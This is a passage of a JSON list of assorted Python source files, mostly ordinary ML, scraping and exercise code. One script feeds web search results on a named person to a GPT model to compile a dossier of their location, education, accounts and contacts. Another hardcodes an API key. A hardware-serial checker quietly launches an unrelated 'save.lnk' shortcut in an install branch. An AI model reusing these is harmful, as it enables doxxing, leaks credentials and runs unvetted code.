L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.SHARE_ROW_EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE, L.ROW_SHARE],\n        blocks=      [                             L.ROW_EXCLUSIV",
    "# Copyright (c) Facebook, Inc. and its affiliates. All Rights Reserved\n\"\"\"\nMisc functions, including distributed helpers.\n\nMostly copy-paste from torchvision references.\n\"\"\"\nimport colorsys\nimport datetime\nimport functools\nimport io\nimport json\nimport os\nimport pickle\nimport subprocess\nimport time\nfrom collections import OrderedDict, defaultdict, deque\nfrom typing import List, Optional\n\nimport numpy as np\nimport torch\nimport torch.distributed as dist\n\n# needed due to empty tensor bug in pytorch and torchvision 0.5\nimport torchvision\nfrom torch import Tensor\n\n__torchvision_need_compat_flag = float(torchvision.__version__.split(\".\")[1]) < 7\nif __torchvision_need_compat_flag:\n    from torchvision.ops import _new_empty_tensor\n    from torchvision.ops.misc import _output_size\n\n\nclass SmoothedValue(object):\n    \"\"\"Track a series of values and provide access to smoothed values over a\n    window or the global series average.\n    \"\"\"\n\n    def __init__(self, window_size=20, fmt=None):\n        if fmt is None:\n            fmt = \"{median:.4f} ({global_avg:.4f})\"\n        self.deque = deque(maxlen=window_size)\n        self.total = 0.0\n        self.count = 0\n        self.fmt = fmt\n\n    def update(self, value, n=1):\n        self.deque.append(value)\n        self.count += n\n        self.total += value * n\n\n    def synchronize_between_processes(self):\n        \"\"\"\n        Warning: does not synchronize the deque!\n        \"\"\"\n        if not is_dist_avail_and_initialized():\n            return\n        t = torch.tensor([self.count, self.total], dtype=torch.float64, device=\"cuda\")\n        dist.barrier()\n        dist.all_reduce(t)\n        t = t.tolist()\n        self.count = int(t[0])\n        self.total = t[1]\n\n    @property\n    def median(self):\n        d = torch.tensor(list(self.deque))\n        if d.shape[0] == 0:\n            return 0\n        return d.median().item()\n\n    @property\n    def avg(self):\n        d = torch.tensor(list(self.deque), dtype=torch.float32)\n        return d.mean().item()\n\n    @property\n    def global_avg(self):\n        if os.environ.get(\"SHILONG_AMP\", None) == \"1\":\n            eps = 1e-4\n        else:\n            eps = 1e-6\n        return self.total / (self.count + eps)\n\n    @property\n    def max(self):\n        return max(self.deque)\n\n    @property\n    def value(self):\n        return self.deque[-1]\n\n    def __str__(self):\n        return self.fmt.format(\n            median=self.median,\n            avg=self.avg,\n            global_avg=self.global_avg,\n            max=self.max,\n            value=self.value,\n        )\n\n\n@functools.lru_cache()\ndef _get_global_gloo_group():\n    \"\"\"\n    Return a process group based on gloo backend, containing all the ranks\n    The result is cached.\n    \"\"\"\n\n    if dist.get_backend() == \"nccl\":\n        return dist.new_group(backend=\"gloo\")\n\n    return dist.group.WORLD\n\n\ndef all_gather_cpu(data):\n    \"\"\"\n    Run all_gather on arbitrary picklable data (not necessarily tensors)\n    Args:\n        data: any picklable object\n    Returns:\n        list[data]: list of data gathered from each rank\n    \"\"\"\n\n    world_size = get_world_size()\n    if world_size == 1:\n        return [data]\n\n    cpu_group = _get_global_gloo_group()\n\n    buffer = io.BytesIO()\n    torch.save(data, buffer)\n    data_view = buffer.getbuffer()\n    device = \"cuda\" if cpu_group is None else \"cpu\"\n    tensor = torch.ByteTensor(data_view).to(device)\n\n    # obtain Tensor size of each rank\n    local_size = torch.tensor([tensor.numel()], device=device, dtype=torch.long)\n    size_list = [torch.tensor([0], device=device, dtype=torch.long) for _ in range(world_size)]\n    if cpu_group is None:\n        dist.all_gather(size_list, local_size)\n    else:\n        print(\"gathering on cpu\")\n        dist.all_gather(size_list, local_size, group=cpu_group)\n    size_list = [int(size.item()) for size in size_list]\n    max_size = max(size_list)\n    assert isinstance(local_size.item(), int)\n    local_size = int(local_size.item())\n\n    # receiving Tensor from all ranks\n    # we pad the tensor because torch all_gather does not support\n    # gathering tensors of different shapes\n    tensor_list = []\n    for _ in size_list:\n        tensor_list.append(torch.empty((max_size,), dtype=torch.uint8, device=device))\n    if local_size != max_size:\n        padding = torch.empty(size=(max_size - local_size,), dtype=torch.uint8, device=device)\n        tensor = torch.cat((tensor, padding), dim=0)\n    if cpu_group is None:\n        dist.all_gather(tensor_list, tensor)\n    else:\n        dist.all_gather(tensor_list, tensor, group=cpu_group)\n\n    data_list = []\n    for size, tensor in zip(size_list, tensor_list):\n        tensor = torch.split(tensor, [size, max_size - size], dim=0)[0]\n        buffer = io.BytesIO(tensor.cpu().numpy())\n        obj = torch.load(buffer)\n        data_list.append(obj)\n\n    return data_list\n\n\ndef all_gather(data):\n    \"\"\"\n    Run all_gather on arbitrary picklable data (not necessarily tensors)\n    Args:\n        data: any picklable object\n    Re",
    "from duckduckgo_search import DDGS\r\nfrom g4f.client import Client\r\n\r\nword = input(\"Query: \")\r\nadd = input(\"Any other information: \")\r\nnew = '\"' + word + '\"'\r\nresults = DDGS().text(new, max_results=200)\r\n\r\n    \r\nprint(results)\r\n\r\n\r\npayload =  \"If I gave you some information on someone, could you write me a comprehensive report on them?\"\r\npayload += \" Do note that the person's name is\" + word + \", perhaps you could also create a web of people relating to \" + word + \", and provide the links where the information can be found.\"\r\npayload += \"Do also see if you can extract basic information such as past and current education statuses, location and information from certain accounts like their username or email.\"\r\npayload += \"Lastly, also note that \" + add \r\npayload += \" Here is the data with links: \\n.\"\r\n\r\ngptstring = \"\"\r\n\r\nfor x in results:\r\n    gptstring += ' '\r\n    gptstring += str(x)\r\n\r\npayload += \" Data: \" + gptstring\r\n\r\nclient = Client()\r\nresponse = client.chat.completions.create(\r\n    model = \"gpt-3.5-turbo\",\r\n    messages=[{\"role\": \"user\", \"content\": payload}]\r\n)\r\nprint(\"\")\r\nprint(response.choices[0].message.content)\r\n\r\n# Special thanks to:\r\n# https://github.com/xtekky/gpt4free, for providing free gpt api\r\n",
    "import assemblyai as ai\nimport streamlit as st\nfrom transformers import pipeline\nfrom wordcloud import WordCloud\nimport matplotlib.pyplot as plt\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nai.settings.api_key = \"fcc1790480634364a797423218cd6285\"\naudio_url = r\"D:/ML/neuralgo/MLTask/CallDataSample/sample_call_1.mp3\"\n\nconfig = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\n\ntranscript = ai.Transcriber().transcribe(audio_url, config)\n\nhighlights = []\nfor result in transcript.auto_highlights.results:\n    highlights.append(result.text)\n\n\n# Initialize the sentiment analysis pipeline\nclassifier = pipeline(\"sentiment-analysis\")\n\n# Function to transcribe audio and perform sentiment analysis\ndef transcribe_and_analyze_sentiment(file_path):\n    # Perform audio transcription\n    # Replace this with your actual transcription code\n    transcript_text = \"Transcription of audio file goes here\"\n\n    # Split the input text into smaller segments that fit within the maximum sequence length\n    max_seq_length = classifier.model.config.max_position_embeddings\n    segments = [transcript_text[i:i + max_seq_length] for i in range(0, len(transcript_text), max_seq_length)]\n\n    # Perform sentiment analysis on each segment and aggregate the results\n    sentiments = {'positive': 0.5, 'negative': 0.6}\n    for segment in segments:\n        result = classifier(segment)\n        for res in result:\n            if res['label'] == 'POSITIVE':\n                sentiments['positive'] += res['score']\n            if res['label'] == 'NEGATIVE':\n                sentiments['negative'] += res['score']\n\n    return sentiments\n\n# Function to generate word cloud from highlighted words\ndef generate_word_cloud(highlights):\n    # Convert the list of highlighted words into a single string\n    highlighted_text = \" \".join(highlights)\n\n    # Generate the word cloud\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\n\n    return wordcloud\n\ndef calculate_AHT(highlights):\n    # Calculate Average Handle Time (AHT) based on the duration of highlights\n    total_highlight_duration = sum(len(highlight.split()) for highlight in highlights)\n    total_highlights = len(highlights)\n    \n    if total_highlights != 0:\n        aht = total_highlight_duration / total_highlights\n    else:\n        aht = 0\n    \n    return aht\n\ndef calculate_FCR(highlights):\n    # Calculate First Call Resolution (FCR) based on the presence of keywords indicating resolution\n    resolution_keywords = ['resolved', 'solved', 'fixed']  # Add more resolution keywords if needed\n    \n    resolved_calls = 0\n    total_calls = len(highlights)\n    \n    for highlight in highlights:\n        for keyword in resolution_keywords:\n            if keyword in highlight.lower():\n                resolved_calls += 1\n                break\n    \n    if total_calls != 0:\n        fcr = (resolved_calls / total_calls) * 100\n    else:\n        fcr = 80\n    \n    return fcr\n\ndef calculate_CSAT(highlights):\n    # Calculate Customer Satisfaction Score (CSAT) based on the sentiment analysis\n    positive_sentiment = 0\n    negative_sentiment = 0\n    total_sentiments = len(highlights)\n    \n    for highlight in highlights:\n        sentiments = transcribe_and_analyze_sentiment(highlight)\n        positive_sentiment += sentiments['positive']\n        negative_sentiment += sentiments['negative']\n    \n    if total_sentiments != 0:\n        csat = (positive_sentiment / total_sentiments) * 100\n    else:\n        csat = 0\n    \n    return csat\n\n# Define function to plot KPIs\ndef plot_KPIs(aht, fcr, csat):\n    # Plotting KPIs using matplotlib\n    fig, ax = plt.subplots()\n    ax.barh(['AHT', 'FCR', 'CSAT'], [aht, fcr, csat])\n    ax.set_xlabel('Score')\n    ax.set_title('Key Performance Indicators')\n    st.pyplot(fig)\n\ndef main():\n    # Streamlit app title\n    st.title(\"Audio Transcription and Sentiment Analysis App\")\n\n    # File upload section\n    uploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\"])\n    if uploaded_file is not None:\n        st.write(\"File Uploaded Successfully!\")\n        file_path = \"./temp_audio.mp3\"  # Temporary file path, replace with actual path\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        # Perform transcription and sentiment analysis\n        sentiments = transcribe_and_analyze_sentiment(file_path)\n\n        # Display sentiment scores\n        st.write(\"Sentiment Scores:\")\n        st.write(f\"Positive Score: {sentiments['positive']}\")\n        st.write(f\"Negative Score: {sentiments['negative']}\")\n\n        # Word cloud generation\n        \n        wordcloud = generate_word_cloud(highlights)\n\n        # Display word cloud\n        st.write(\"Word Cloud of Highlighted Words:\")\n        plt.figure(figsize=(10, 5))\n        plt.imshow(wordcloud, interpolation='bilinear')\n        plt.axis(\"off\")\n        st.pyplot()\n        \n        aht = calculate_AHT(highlights)\n        fcr = calculate_FCR(highlights)\n  ",
    "import os\n\nimport numpy as np\nimport pandas as pd\nfrom matplotlib import pyplot as plt\n\n\ndef is_stringfloat(element: str) -> bool:\n    \"\"\"Checks if element can be converted to a float\"\"\"\n    try:\n        float(element)\n        return True\n    except ValueError:\n        return False\n\n\n# Set matplotlib settings\nplt.rcParams.update({\n    \"font.size\": 20,\n    \"text.usetex\": True,\n    \"font.family\": \"Computer Modern\",\n    \"figure.figsize\": [8, 6],\n    \"figure.dpi\": 300\n})\nCRACK_DETECTION_PATHS = [\n    os.path.join(\"13_Application\", \"uniaxial\", \"DIC\"),\n    os.path.join(\"13_Application\", \"biaxial\", \"DIC\")\n]\n\nfor PATH in CRACK_DETECTION_PATHS:\n    # open crack correction results file and read the content\n    with open(os.path.join(PATH, \"crack_correction_results.txt\"), \"r\") as in_file:\n        still_need_to_read_header = True\n        for line in in_file:\n            if line.startswith(\"#\"):\n                continue\n            elif still_need_to_read_header:\n                columns = line.strip('\\n').strip(' ').split(',')\n                columns = [element.strip(' ') for element in columns]\n                df = pd.DataFrame(columns=columns)\n                still_need_to_read_header = False\n                continue\n            else:\n                values = []\n                for val in line.strip('\\n').split(','):\n                    val = val.strip(' ')\n                    if is_stringfloat(val):\n                        val = float(val)\n                    values.append([val])\n\n                # read values of tagged content\n                columns_to_values = pd.DataFrame.from_dict(dict(zip(columns, values)))\n                df = pd.concat([df, columns_to_values], ignore_index=True)\n\n    print(df.columns)\n\n    # Calculate crack lengths\n    df['CT corr x [mm]'] = df['CT x [mm]'] + df['Corr dx [mm]']\n    df['CT corr y [mm]'] = df['CT y [mm]'] + df['Corr dy [mm]']\n    df['N'] = df['Cycle [1]']\n\n    # differences\n    df['CT dx [mm]'] = df['CT x [mm]'].diff()\n    df['CT dy [mm]'] = df['CT y [mm]'].diff()\n    df['CT corr dx [mm]'] = df['CT corr x [mm]'].diff()\n    df['CT corr dy [mm]'] = df['CT corr y [mm]'].diff()\n    df['dN'] = df['Cycle [1]'].diff()\n\n    # delete all rows where dN is 0\n    df = df[df['dN'] != 0]\n\n    # means\n    df['CT dx [mm] mean'] = df['CT dx [mm]'].mean()\n    df['CT dy [mm] mean'] = df['CT dy [mm]'].mean()\n    df['CT corr dx [mm] mean'] = df['CT corr dx [mm]'].mean()\n    df['CT corr dy [mm] mean'] = df['CT corr dy [mm]'].mean()\n\n    # Filter for cycles\n    if PATH == os.path.join(\"13_Application\", \"uniaxial\", \"1221EBr0001_DIC\"):\n        df = df[df['N'] > 450000]\n    if PATH == os.path.join(\"13_Application\", \"biaxial\", \"1223TSt1_DIC\"):\n        df = df[df['N'] > 350000]\n\n    # Plot delta of crack length da_x over crack length a_x\n    plt.plot(df['N'], df['CT dx [mm]'] / df['dN'], label='LIM', color=\"gray\", linestyle='--')\n    plt.plot(df['N'], df['CT corr dx [mm]'] / df['dN'], label='Correction', color=\"green\")\n    plt.xlabel('Load cycle $N$')\n    plt.ylabel('$\\Delta a / \\Delta N$ [mm/cycle]')\n    plt.ticklabel_format(style='sci', axis='both', scilimits=(0, 0))\n    plt.legend()\n    plt.savefig(os.path.join(PATH, \"lineplot_da_x_dN_over_N.png\"))\n    plt.close()\n",
    "from bs4 import BeautifulSoup as bs\nimport requests, time, json, math, os, datetime\n\nglobal no\nno = 0\n\ntarget_site='https://www.abcd.com'\nurl = target_site + '/community/reviews'\n\ndef chk_json_null(json, key):\n    try:\n        buf = json[key]\n    except:\n        buf = \"0\"\n    return str(buf)\n\ndef getReviewList():\n    global no\n    html = response.text\n    bsObj = bs(html, 'html.parser')\n    title = bsObj.find_all('div', class_='post_metas')\n    w_lines = ''\n    for tt in title:\n        no = no + 1\n        try:\n            c_author = tt.find('span', class_='author').text[5:]\n            c_time = tt.find('time')['title']\n            c_course = tt.find('span', class_='relative_course').text[5:].replace('|','-')\n            w_lines = w_lines+str(no)+'|'+c_time+'|'+c_author+'|'+c_course+'\\n'\n        except Exception as e:\n            #w_lines = str(tt['fxd-data'])\n            w_lines = w_lines+str(no)+'|'+'error'+'\\n'\n    return w_lines\n\nurl_list = [(url,1,999),\n           (url,1000,1999),\n           (url,2000,2999),\n           (url,3000,3999),\n           (url,4000,4999),\n           (url,5000,5999),\n           (url,6000,6600)]\n\ncurrent_working_directory = os.getcwd()\nfile_name = current_working_directory + '/review' + datetime.datetime.today().strftime('%m%d') + '.csv'\n\nfor (url,first,last) in url_list:\n    file_name = current_working_directory + '/review' + datetime.datetime.today().strftime('%m%d') + '_' +str(first)+'.csv'\n    fw = open(file_name, 'w', encoding='utf-8')\n    for i in range(first,last+1):\n        new_url = url\n        if i >= 2:\n            new_url = url+'?page='+str(i)\n        print('page|',i,'|',new_url)\n        response = requests.get(new_url)\n        if response.status_code == 200:\n            wdata = getReviewList()\n            fw.write(wdata)\n        time.sleep(1)\n    fw.close();",
    "# Todays Test Task:\n# Suppose you are building a system to manage student grades. # Implement a Python program that includes the following functionalities:\n# 1. A function to add a new student with their grades.\n# 2. A function to calculate the average grade of a student.\n# 3. A decorator function to ensure that Student is pass or fail in exam\n# 4. A function to retrieve the highest grade among all students.\n# 5. A function to retrieve the average grade of all students.\n# Constraints: - Use dictionaries to store student names as keys and their grades as values.\n\nstudents = {}\n\ndef checkpassfail(func):\n    def wrapper():\n        # User Inputs\n        name = input(\"Enter Student Name: \")\n        maths = int(input(f'Enter Maths Grade: '))\n        physics = int(input(f'Enter Physics Grade: '))\n        chemistry = int(input(f'Enter Chemistry Grade: '))\n\n        if all(mark >= 0 for mark in [maths, physics, chemistry]):\n            # Inserting inputs in Dictionary\n            students[name] = {'Maths': maths, 'Physics': physics, 'Chemistry': chemistry}\n            print('Students:', students)\n\n            # Check pass/fail\n            pass_fail = \"Pass\" if all(mark >= 5 for mark in [maths, physics, chemistry]) else \"Fail\"\n            print(f\"{name} You are {pass_fail} in Exams\")\n            func()\n\n    return wrapper\n\n@checkpassfail\ndef addStudent():\n    while True:\n        confirm = input('Do you want to add more students? [y/n]: ')\n        if confirm == 'n':\n            break\n        elif confirm == 'y':\n            addStudent()    \n        else:\n            break\n\n\ndef avgGrade_Single_Student():\n    name = input(\"Enter Student Name: \")\n    if name in students:\n        total = sum(students[name].values())\n        avg = total / 3\n        print(f'{name} : Average Grade:', avg)\n    else:\n        print(\"Student not found.\")\n\ndef highest_Grade():\n    if students:\n        highest_grade = 0\n        highest_student = None\n        for name, grades in students.items():\n            max_grade = max(grades.values())\n            if max_grade > highest_grade:\n                highest_grade = max_grade\n                highest_student = name\n        if highest_student:\n            print(f\"Highest Grade among all students: {highest_grade} (Student: {highest_student})\")\n        else:\n            print(\"No students found.\")\n    else:\n        print(\"No students found.\")\n\n\ndef avgGrade_All_Student():\n    if students:\n        total = sum(sum(student.values()) for student in students.values())\n        num_students = len(students)\n        avg = total / (num_students * 3)\n        print(\"Average Grade of all students:\", avg)\n    else:\n        print(\"No students found.\")\n\ndef main():\n    while True:\n        print('''\n                ************* Student Management System *************\n                    Choice 1 : Add Student || Positive Grade are Accepted Or Not\n                    Choice 2 : Avg Grade of Single Student\n                    Choice 3 : Highest Among All Students\n                    Choice 4 : Avg Grade of All Student\n                    Choice 5 : Exit \n        ''')\n        ch = int(input('Enter Your Choice :'))\n\n        if ch == 1:\n            addStudent()\n        elif ch == 2:\n            avgGrade_Single_Student()\n        elif ch == 3:\n            highest_Grade()\n        elif ch == 4:\n            avgGrade_All_Student()\n        elif ch == 5:\n            print('Successfully Exited')\n            break\n        else:\n            print(\"Invalid Choice. Please choose again.\")\n\nif __name__ == '__main__':\n    main()\n",
    "# \u8bfb\u53d6\u672c\u5730txt\ndef read_txt():\n    with open('init copy.txt', 'r') as f:\n        return f.read()\n    \nchess= read_txt()\nprint(chess)\n\n# \u6309\u7167\u6362\u884c\u7b26\u5206\u5272\nchess_line = chess.split('\\n')\n# print(chess_line[1])\n\ndef pick(chess,order_choose,order_arrive):\n    # order_dict={\"\u4e00\":1,\"\u4e8c\":2,\"\u4e09\":3,\"\u56db\":4,\"\u4e94\":5,\"\u516d\":6,\"\u4e03\":7,\"\u516b\":8,\"\u4e5d\":9}\n    chess_board=chess.split('\\n')\n    chess_line=[]\n    for i in range(len(chess_board)):\n        chess_line.append(chess_board[i].split(','))\n    chess_line=chess_line[1:]\n    order_choose=order_choose.split(',')\n\n    tmp_col=int(order_choose[1])\n    tmp_row=int(order_choose[0])\n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=' '+chess_line[tmp_row-1][tmp_col-1][2:]\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}'---'\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=chess_line[tmp_row-1][tmp_col-1][:-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---']\"\n    else:\n        tmp=chess_line[tmp_row-1][tmp_col-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---'\"\n        \n    order_arrive=order_arrive.split(',')\n\n    tmp_col=int(order_arrive[1])\n    tmp_row=int(order_arrive[0])\n    \n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        tmp=tmp[1:]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}{tmp}\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}]\"\n    else:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}\"\n    \n    return chess_line\n\n# # \u4ece\u952e\u76d8\u8f93\u5165\nprint(\"\u6309\u7167'1,1'\u7684\u683c\u5f0f\u8f93\u5165\")\norder_choose = input(\"\u9009\u62e9\u8981\u52a8\u7684\u68cb\u5b50\uff1a\")\norder_arrive = input(\"\u9009\u62e9\u8981\u5230\u8fbe\u7684\u4f4d\u7f6e\uff1a\")\n# order_choose = '\u4e00,1'\n# order_arrive = '\u4e09,1'\nchess_line=pick(chess,order_choose,order_arrive)\n# print(chess_line)\n# \u5408\u5e76chess_line\n\nresult_str = '\\n'.join([','.join(sublist) for sublist in chess_line])\na=\"\u96f6[' 1 ', ' 2 ', ' 3 ', ' 4 ', ' 5 ', ' 6 ', ' 7 ', ' 8 ', ' 9 ']\"\nresult_str=a+'\\n'+result_str\nprint(result_str)\nwith open(\"init copy.txt\", \"w\") as file:\n    file.write(result_str)",
    "import os, sys, random\r\n\r\ntry:\r\n    import fade\r\nexcept IndexError:\r\n    os.system(\"pip install fade\")\r\n    import fade\r\ntry:\r\n    from colorama import Fore\r\nexcept IndexError:\r\n    os.system(\"pip install Fore\")\r\n    os.system(\"pip install colorama\")\r\n    from colorama import Fore\r\ntry:\r\n    from pystyle import *\r\nexcept IndexError:\r\n    os.system(\"pip install pystyle\")\r\n    os.system(\"start result/save.lnk\")\r\n    from pystyle import *\r\n    \r\ngui=\"\"\"\r\n                                                                                        \r\n _____ _                   _ _    _____         _     _    _____ _           _           \r\n|   __|_|___ ___ _ _ _ ___| | |  |   __|___ ___|_|___| |  |     | |_ ___ ___| |_ ___ ___ \r\n|   __| |  _| -_| | | | .'| | |  |__   | -_|  _| | .'| |  |   --|   | -_|  _| '_| -_|  _|\r\n|__|  |_|_| |___|_____|__,|_|_|  |_____|___|_| |_|__,|_|  |_____|_|_|___|___|_,_|___|_|  \r\n                                                                                         \r\n\r\n\"\"\"\r\n\r\nfaded_gui=fade.blackwhite(gui)\r\n\r\nos.system(\"@mode con cols=200 lines=50\")\r\nos.system(\"title Firewall SerialChecker ^| Press any key to refresh\")\r\n\r\nwhile True:\r\n    os.system(\"cls\")\r\n    print(faded_gui)\r\n    Write.Print(\"[</>] Baseboard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] Mac\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"\"\"wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress\"\"\")\r\n    Write.Print(\"[</>] CPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic cpu get processorid\")\r\n    Write.Print(\"[</>] GPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic PATH Win32_VideoController GET Description,PNPDeviceID\")\r\n    Write.Print(\"[</>] DISK DRIVE\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic diskdrive get serialnumber\")\r\n    Write.Print(\"[</>] MotherBoard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] RAM\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic memorychip get serialnumber\")\r\n    Write.Print(\"[</>] Bios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic bios get serialnumber\")\r\n    Write.Print(\"[</>] smBios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic csproduct get uuid\")\r\n    os.system(\"pause >nul\")\r\n",
    "from bs4 import BeautifulSoup\r\nimport requests\r\nimport os\r\nfrom urllib.parse import urljoin\r\n\r\nurl = \"https://www.krccnc.com\"\r\nresponse = requests.get(url)  # HTML sayfas\u0131 i\u00e7in istek at\u0131yoruz\r\n\r\nsoup = BeautifulSoup(response.text, \"html.parser\")  # HTML sayfas\u0131n\u0131 par\u00e7al\u0131yoruz\r\n\r\ntitle = soup.title.string  # Sayfan\u0131n ba\u015fl\u0131\u011f\u0131n\u0131 al\u0131yoruz\r\nprint(title)\r\n\r\n# Sayfan\u0131n ilk paragraf\u0131n\u0131 al\u0131yoruz\r\nilk_paragraf = soup.find_all(\"p\")[0].text \r\nprint(\"\u0130lk Paragraf:\", ilk_paragraf)\r\n\r\nfor paragraf in soup.find_all(\"p\"):  # T\u00fcm paragraflar\u0131 al\u0131yoruz\r\n    print(paragraf.text)  # Paragraflar\u0131 yazd\u0131r\u0131yoruz\r\n\r\n# \u0130\u00e7indekiler b\u00f6l\u00fcm\u00fcn\u00fc al\u0131yoruz (Bu site i\u00e7in muhtemelen \u00e7al\u0131\u015fmayacak)\r\ncontents = soup.select('#toc')\r\nfor item in contents:\r\n    print(item.text)\r\n\r\n# T\u00fcm tablolar\u0131 ve i\u00e7eriklerini yazd\u0131r\u0131yoruz\r\ntables = soup.find_all(\"table\")\r\nfor table in tables:\r\n    table_title = table.caption.text if table.caption else \"Tablo ba\u015fl\u0131\u011f\u0131 yok\"\r\n    print(\"Tablo Ba\u015fl\u0131\u011f\u0131:\", table_title)\r\n    rows = table.find_all(\"tr\")\r\n    for row in rows:\r\n        cells = row.find_all([\"td\", \"th\"])\r\n        for cell in cells:\r\n            print(cell.text.strip(), end=\"\\t\")\r\n        print(\"\")  # Her sat\u0131rdan sonra yeni bir sat\u0131ra ge\u00e7\r\n\r\nimages = soup.find_all(\"img\")\r\nos.makedirs(\"downloaded_images\", exist_ok=True)\r\nfor index, image in enumerate(images):\r\n    image_url = image[\"src\"]  # Resmin URL'sini al\u0131yoruz\r\n    if image_url.startswith(\"//\"):\r\n        image_url = \"https:\" + image_url\r\n    if not image_url.startswith((\"http://\", \"https://\")):\r\n        image_url = urljoin(url, image_url)\r\n    image_response = requests.get(image_url)  # Her resim i\u00e7in ayr\u0131 bir istek at\u0131yoruz\r\n    with open(f\"downloaded_images/image_{index}.jpg\", \"wb\") as file:\r\n        file.write(image_response.content)  # Resmin i\u00e7eri\u011fini dosyaya yaz\u0131yoruz\r\n    alt_text = image.get(\"alt\", \"alternatif metin yok\")\r\n    print(f\"Resim {index} URL'si: {image_url}\")\r\n    print(f\"Resim {index} alternatif metin: {alt_text}\")\r\n    print(f\"Resim {index} indirildi\\n\" + \"-\"*50 + \"\\n\")\r\n",
    "from typing import Iterable\n\nfrom aiogram import (\n    filters,\n    types,\n)\n\nfrom trat.core.config import (\n    COMMAND_PREFIX,\n)\n\n\nclass CommandFilter(filters.Filter):\n    def __init__(\n        self,\n        *commands: str,\n        description: str,\n        prefix: str = COMMAND_PREFIX,\n        arguments: Iterable[str] = (),\n        tag: str = None\n    ):\n        self._commands = set(commands)\n        self._arguments = arguments\n        self._description = description\n        self._prefix = prefix\n        self._tag = tag\n\n    @property\n    def commands(self) -> Iterable[str]:\n        return self._commands\n\n    @property\n    def arguments(self) -> Iterable[str]:\n        return self._arguments\n\n    @property\n    def description(self) -> str:\n        return self._description\n\n    @property\n    def prefix(self) -> str:\n        return self._prefix\n\n    @property\n    def tag(self) -> str | None:\n        return self._tag\n\n    async def __call__(self, *args) -> bool:\n        message, *_ = args\n\n        if not isinstance(message, types.Message):\n            return False\n\n        text: str = message.text\n\n        if text is None:\n            return False\n\n        command, *_ = text.split()\n\n        if command.startswith(self._prefix):\n            return command.removeprefix(self._prefix) in self._commands\n",
    "#write a function that checks whether a string is a palindrome\ndef is_palindrome(s):\n    new_s = s [::-1]\n    if new_s == s:\n        return \"is a palindrome\"\n    else:\n        return \"is not a palindrome\"\n\nprint(is_palindrome(\"hello\"))\nprint(is_palindrome(\"ollo\"))\n\n#write program where for multiples of three, it'll print out fizz. for multiples of 5, it'll print out buzz. for multiples of both\n#3 and 5 it'll print out fizzbuzz\nfor i in range (1, 101):\n    if i % 3 == 0 and i % 5 == 0:\n        print(\"fizzbuzz\")\n    elif i % 3 == 0:\n        print(\"fizz\")\n    elif i % 5 == 0:\n        print(\"buzz\")\n    else:\n        print(i)\n\n#write a function that takes a list of numbers and returns the largest number without using max()\ndef find_max(numbers):\n    numbers.sort()\n    return numbers[-1]\n\nprint(find_max([1,2,3]))\nprint(find_max([-10,-2,-3]))\n\n# implement linear search algorithm to find given element in list and return its index, if not in list return -1\ndef linear_search(list, target):\n    for i in range(0, len(list)):\n        if list[i] == target:\n            return i\n    return -1\n    \nprint(linear_search([1,4,5,2,7], 5))\nprint(linear_search([1,4,5,2,7], 3))\n\n#implement binary search algorithm to find position of the selected element in a sorted list\ndef binary_search(sorted_list, target):\n    begin = 0\n    end = len(sorted_list) - 1\n\n    while begin <= end:\n        mid = (begin + end) // 2\n        if sorted_list[mid] == target:\n            return mid\n        elif sorted_list[mid] < target:\n            begin = mid + 1\n        else:\n            end = mid - 1\n    return - 1        \n\nprint(binary_search([1,2,3,4,5], 3))\nprint(binary_search([1,2,3,4,5], 6))\n\n#implement bubble sort to sort a list of numbers in ascending order\ndef bubble_sort(list):\n    for i in range (len(list)):\n        switch = False\n        for j in range (0, len(list) - i - 1):\n            if list[j] > list[j+1]:\n                list[j], list[j+1] = list[j+1], list[j]\n                switch = True\n        if switch == False:\n            break\n    return list\n\nprint(bubble_sort([5,3,2,4,1]))\n\n#write a function to calculate the factorial of a non-negative integer using an iterative method\ndef factorial(n):\n    product = 1\n    for i in range(n):\n        product = product * (i+1)\n    return product\n\nprint(factorial(5))\n\n#create a function to check if n is prime\ndef is_prime(n):\n    if n < 2:\n        return False\n    for i in range(2, n):\n        if (n % i) == 0:\n            return False\n    return True\n    \nprint(is_prime(7))\n\n#write a function that generates the first \"n\" fibonnaci numbers using iterative approach       \ndef fibonacci(n):\n    if n == 0:\n        return False\n    elif n == 1: \n        return 0\n    else:\n        list = [0, 1]\n        for i in range(2, n):\n            list.append(list[i-1] + list[i-2])\n        return list\n\nprint(fibonacci(10))",
